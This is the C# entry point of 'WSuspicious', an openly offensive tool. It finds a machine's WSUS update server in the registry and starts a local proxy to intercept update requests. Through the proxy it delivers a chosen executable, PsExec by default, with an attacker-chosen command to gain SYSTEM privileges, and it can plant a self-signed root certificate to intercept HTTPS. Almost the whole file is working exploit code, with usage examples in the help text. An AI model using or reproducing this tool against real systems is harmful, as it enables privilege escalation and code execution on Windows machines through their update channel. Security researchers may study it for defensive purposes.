using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using Microsoft.Win32;
using WSuspicious.Servers;
using WSuspicious.Servers.Proxy;
using WSuspicious.Servers.Proxy.tls;
using WSuspicious.Utility;

namespace WSuspicious
{
    class Program
    {
        public static int Main(string[] args)
        {
            Dictionary<string, string> arguments = ArgumentsParser.parse(args);
            if (arguments.ContainsKey("/help"))
            {
                PrintHelp();
                return 0;
            }

            string wsusConfig = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\", "WUServer", null);

            string wsusHost = null;
            if (wsusConfig != null)
            {
                Uri wsusURI = new Uri(wsusConfig);
                wsusHost = wsusURI.Host;

                X509Certificate2 cert = null;
                if (wsusURI.Scheme == "https" && arguments.ContainsKey("/enabletls"))
                {
                    Console.WriteLine("The WSUS Server is using HTTPS. Adding a self-signed certificate to store");
                    cert = CertificateMaker.MakeCertificate(wsusHost);
                    Console.WriteLine("Prompting user to add the certificate. Please wait.");
                    CertificateMaker.AddToTrustStore(cert);
                }
                else if (wsusURI.Scheme == "https")
                {
                    Console.WriteLine("The WSUS Server is using HTTPS and we are not configured to accept TLS connections.");
                    Console.WriteLine("Exiting now.");
                    return 0;
                }

                Console.WriteLine(String.Format("Detected WSUS Server - {0}", wsusHost));

                byte[] payloadFile = File.ReadAllBytes(arguments["/exe"]);

                HttpServer serv = null;
                if (arguments.ContainsKey("/downloadport"))
                {
                    // We are configured to deliver the payload via a self-hosted server. Lets start it
                    serv = new HttpServer(int.Parse(arguments["/downloadport"]), payloadFile);
                    serv.Start();
                }

                using (WsusProxy proxy = new WsusProxy(wsusHost, payloadFile, Path.GetFileName(arguments["/exe"]), arguments["/command"], arguments.ContainsKey("/debug"), (arguments.ContainsKey("/downloadport") ? String.Format("localhost:{0}", arguments["/downloadport"]) : null), cert))
                {
                    proxy.Start(int.Parse(arguments["/proxyport"]));

                    Console.WriteLine("Hit any key to exit..");

                    if (arguments.ContainsKey("/autoinstall"))
                    {
                        WindowsUpdateLauncher.StartUpdates();
                    }

                    Console.WriteLine();
                    Console.Read();
                }

                // We advice people to cleanup the cert that we added into the store
                if (wsusURI.Scheme == "https" && arguments.ContainsKey("/enabletls"))
                {
                    Console.WriteLine("Consider removing the self-signed certificate from the store (Warning: it will prompt the user again).");
                }

                // We cleanup the payload delivery server just in case (if any)
                if (serv != null)
                {
                    serv.Stop();
                }
            }
            else
            {
                Console.WriteLine("No WSUS Server detected.");
                Console.WriteLine("Stopping now.");
            }
            return 0;
        }

        public static void PrintHelp()
        {
            Console.WriteLine(@"
                Usage: WSuspicious [OPTION]...
                    Ex. WSuspicious.exe /command:"" - accepteula - s - d cmd / c """"echo 1 > C:\\wsuspicious.txt"""""" /autoinstall
                Creates a local proxy to intercept WSUS requests and try to escalate privileges.
                If launched without any arguments, the script will simply create the file C:\\wsuspicious.was.here

                  /exe                The full path to the executable to run
                                      Known payloads are bginfo and PsExec. (Default: .\PsExec64.exe)
                  /command            The command to execute (Default: -accepteula -s -d cmd /c ""echo 1 > C:\\wsuspicious.was.here"")
                  /proxyport          The port on which the proxy is started. (Default: 13337)
                  /downloadport       The port on which the web server hosting the payload is started. (Sometimes useful for older Windows versions)
                                      If not specified, the server will try to intercept the request to the legitimate server instead.
                  /debug              Increase the verbosity of the tool
                  /autoinstall        Start Windows updates automatically after the proxy is started.
                  /enabletls          Enable HTTPS interception. WARNING. NOT OPSEC SAFE. 
                                      This will prompt the user to add the certificate to the trusted root.
                  /help               Display this help and exit
            ");
        }
    }
}
